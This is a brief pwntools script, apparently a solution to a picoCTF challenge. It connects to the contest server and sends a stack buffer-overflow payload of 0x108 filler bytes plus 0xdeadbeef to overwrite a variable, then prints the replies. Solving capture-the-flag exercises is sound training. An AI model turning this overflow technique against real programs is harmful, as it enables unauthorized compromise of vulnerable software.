from pwn import *

io = remote('mars.picoctf.net',31890)
#io = remote('127.0.0.1',1234)
#io = process('./chall')
print 'Connected'
print io.recvuntil('What do you see?')
io.sendline(0x100*'A'+8*'A'+'\xef\xbe\xad\xde')

print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))

